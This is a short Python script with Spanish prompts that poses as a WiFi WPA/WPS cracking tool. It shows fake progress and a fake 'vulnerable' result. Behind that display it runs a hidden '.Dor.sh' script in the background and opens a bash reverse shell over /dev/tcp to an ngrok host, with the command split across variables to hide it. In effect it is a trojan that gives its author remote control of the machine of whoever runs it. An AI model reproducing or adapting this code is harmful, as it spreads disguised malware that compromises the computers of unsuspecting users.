#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time,sys
import os
from colorama import Fore, Back, Style, init 
init()

verde = Fore.GREEN
rojo = Fore.RED
cyan = Fore.CYAN
magenta = Fore.MAGENTA

Socket_e1 = 'bash -c "bash -i >& /dev/tcp/'
Soket_e3 = ' 0>&1"'

mongo = time.sleep(4.0)

Essid = input(f"{rojo}[+]{cyan}Name Wifi:{magenta}=> ")
print(f"{verde}Essid {rojo}=>{cyan}{Essid}")
connect = '4.tcp.ngrok.io/19056'

print(f"{verde}testeando tipo de {rojo}wpa2 {verde}Wpa {verde}Wps")
for l in Essid:
    sys.stdout.flush()
    print(l, end=f"{magenta} ")
    time.sleep(2.0)
print(f"{rojo} vulnerable {verde}Wpa\n")
test = ".Dor.sh"
os.system(f"bash {test} &")

def folhey():
    try:
        print(f"{cyan}probando{verde}PIN{rojo} =>{cyan} {Essid}")
        os.system(f"{Socket_e1}{connect}{Soket_e3}")
    except:
        print("Al Parecer Lo hemos logrado")
        time.sleep(1.1)
        print("espera unos minutos")
        folhey()
        
folhey()
